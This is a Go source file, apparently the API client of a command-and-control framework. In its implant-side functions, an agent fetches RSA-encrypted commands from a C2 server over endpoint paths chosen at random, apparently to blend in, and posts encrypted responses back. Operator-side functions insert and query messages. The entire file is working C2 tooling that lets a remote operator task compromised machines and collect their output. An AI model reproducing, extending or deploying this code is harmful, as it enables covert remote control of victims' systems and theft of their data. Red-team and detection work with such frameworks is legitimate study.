package c2api

import (
	"bufio"
	"bytes"
	"crypto/rsa"
	"encoding/json"
	"errors"
	"io"
	"net/http"
	"strings"
	"time"

	cry "github.com/zarkones/xena-crypto"
)

const MESSAGE_STREAM_SEPARATOR = "\r\r\r\r\r"

func AgentMessagesSubscribe(agentID string, decryptionKey *rsa.PrivateKey, messageCallback func(message Message), messageDeserializationFailedCallback func(messageBuffer string, err error), shouldExit func() (exit bool)) (err error) {
	if decryptionKey == nil {
		return ErrKeyIsNil
	}

	endpointPaths := RouteMap[R_FETCH_MESSAGES_LIVE]
	endpointPath := randElem(&endpointPaths)
	req, err := http.NewRequest(http.MethodGet, *BaseURL+"/"+endpointPath+"/"+agentID, nil)
	if err != nil {
		return err
	}

	resp, err := c.Do(req)
	if err != nil {
		return err
	}

	defer resp.Body.Close()

	reader := bufio.NewReader(resp.Body)
	encryptedMsgBuff := ""

	specialSuffix := MESSAGE_STREAM_SEPARATOR + "\n"

	for {
		messageChunk, err := reader.ReadString('\n')
		if err != nil {
			if err == io.EOF {
				time.Sleep(time.Second)
				break
			}
			continue
		}

		encryptedMsgBuff += messageChunk

		if !strings.Contains(messageChunk, specialSuffix) {
			continue
		}

		encryptedMsgBuff = strings.TrimSuffix(encryptedMsgBuff, specialSuffix)

		decryptedMsgBuff, err := cry.DecryptRSAOAEPDecodeHex(*decryptionKey, encryptedMsgBuff)
		if err != nil {
			messageDeserializationFailedCallback(encryptedMsgBuff, err)
			encryptedMsgBuff = ""
			continue
		}

		var message Message
		if err := json.Unmarshal([]byte(decryptedMsgBuff), &message); err != nil {
			messageDeserializationFailedCallback(encryptedMsgBuff, err)
			encryptedMsgBuff = ""
			continue
		}

		encryptedMsgBuff = ""

		messageCallback(message)

		if shouldExit() {
			break
		}
	}

	return nil
}

// FetchMessages will reach out to C2 server and fetch messages.
func FetchMessages(agentID string) (messages []Message, err error) {
	req, err := http.NewRequest(http.MethodGet, *BaseURL+"/v1/messages/"+agentID, nil)
	if err != nil {
		return nil, err
	}

	setAuth(req)

	resp, err := c.Do(req)
	if err != nil {
		return nil, err
	}

	if err = json.NewDecoder(resp.Body).Decode(&messages); err != nil {
		return nil, err
	}

	return messages, nil
}

// AgentFetchMessages will reach out to C2 server and fetch messages to which it has not reponded.
func AgentFetchMessages(agentID string, decryptionKey *rsa.PrivateKey) (messages []Message, err error) {
	if decryptionKey == nil {
		return nil, ErrKeyIsNil
	}

	endpointPaths := RouteMap[R_FETCH_MESSAGES]
	endpointPath := randElem(&endpointPaths)
	req, err := http.NewRequest(http.MethodGet, *BaseURL+"/"+endpointPath+"/"+agentID, nil)
	if err != nil {
		return nil, err
	}

	resp, err := c.Do(req)
	if err != nil {
		return nil, err
	}

	if resp.StatusCode == http.StatusNoContent {
		return nil, nil
	}

	respBody, err := io.ReadAll(resp.Body)
	if err != nil {
		return nil, err
	}

	decrypted, err := cry.SecureUnwrap(decryptionKey, string(respBody))
	if err != nil {
		return nil, err
	}

	if err := json.Unmarshal([]byte(decrypted), &messages); err != nil {
		return nil, err
	}

	return messages, nil
}

type AgentMsgRespCtx struct {
	MessageID           string `json:"messageId"`
	PipelineExecutionID string `json:"pipelineExecutionId"`
	Response            string `json:"response"`
}

// AgentRespondToMessage allows an agent to respond to a message.
func AgentRespondToMessage(messageID, pipelineExecutionID, response string) (err error) {
	if TrustedPubKey == nil {
		return ErrTrustedKeyIsNil
	}

	msgResp := AgentMsgRespCtx{
		MessageID:           messageID,
		PipelineExecutionID: pipelineExecutionID,
		Response:            response,
	}

	jsonMsgResp, err := json.Marshal(&msgResp)
	if err != nil {
		return err
	}

	encrypted, err := cry.SecureWrap(TrustedPubKey, string(jsonMsgResp))
	if err != nil {
		return err
	}

	endpointPaths := RouteMap[R_MESSAGE_RESPOND]
	endpointPath := randElem(&endpointPaths)
	req, err := http.NewRequest(http.MethodPost, *BaseURL+"/"+endpointPath, bytes.NewBuffer([]byte(encrypted)))
	if err != nil {
		return err
	}

	resp, err := c.Do(req)
	if err != nil {
		return err
	}

	if resp.StatusCode != http.StatusOK {
		return ErrUnexpectedStatusCode
	}

	return nil
}

// InsertMessage allows an operator to insert a message.
func InsertMessage(message Message) (err error) {
	jsonMsgResp, err := json.Marshal(&message)
	if err != nil {
		return err
	}

	req, err := http.NewRequest(http.MethodPost, *BaseURL+"/v1/messages", bytes.NewBuffer(jsonMsgResp))
	if err != nil {
		return err
	}

	setAuth(req)

	resp, err := c.Do(req)
	if err != nil {
		return err
	}

	if resp.StatusCode != http.StatusCreated {
		return ErrUnexpectedStatusCode
	}

	return nil
}

// GetMessageByReq returns a message by agent ID and message's request.
func GetMessageByReq(agentID, request string) (message Message, err error) {
	req, err := http.NewRequest(http.MethodGet, *BaseURL+"/v1/message?agentID="+agentID+"&request="+request, nil)
	if err != nil {
		return message, err
	}

	setAuth(req)

	resp, err := c.Do(req)
	if err != nil {
		return message, err
	}

	if resp.StatusCode != http.StatusOK {
		return message, errors.Join(ErrUnexpectedStatusCode, errors.New(resp.Status))
	}

	respBody, err := io.ReadAll(resp.Body)
	if err != nil {
		return message, err
	}

	return message, json.Unmarshal(respBody, &message)
}

// GetMessageByID returns a message by agent ID and message's request.
func GetMessageByID(messageID string) (message Message, err error) {
	req, err := http.NewRequest(http.MethodGet, *BaseURL+"/v1/message?messageID="+messageID, nil)
	if err != nil {
		return message, err
	}

	setAuth(req)

	resp, err := c.Do(req)
	if err != nil {
		return message, err
	}

	if resp.StatusCode != http.StatusOK {
		return message, errors.Join(ErrUnexpectedStatusCode, errors.New(resp.Status))
	}

	respBody, err := io.ReadAll(resp.Body)
	if err != nil {
		return message, err
	}

	return message, json.Unmarshal(respBody, &message)
}
